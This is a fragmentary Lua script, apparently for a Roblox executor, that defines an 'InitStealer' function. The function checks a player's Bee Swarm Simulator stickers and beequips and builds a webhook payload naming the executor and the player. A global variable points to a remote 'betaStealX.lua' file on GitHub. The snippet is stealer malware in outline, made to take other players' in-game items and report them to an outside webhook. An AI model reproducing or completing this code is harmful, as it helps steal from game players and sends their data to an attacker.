_G.LINK = "https://raw.githubusercontent.com/K-0N/mytest2/refs/heads/main/betaStealX.lua"
...
local function InitStealer(UserWhitelist, Webhook, WhitelistedStickers, AtlasLoadstring)
    pcall(function()
        ...
        if #Stickers > 0 or #Beequips > 0 then
            ...
            _G.Exodus_WebhookBody = {
                ...
                user = {
                    ...
                    name = identifyexecutor() .. " - " .. LocalPlayer.Name .. (game.PlaceId == 15579077077 and " [Hive Hub]" or ""),
                ...
                wusername = "Atlas hook" -- wusername is intentional
            }
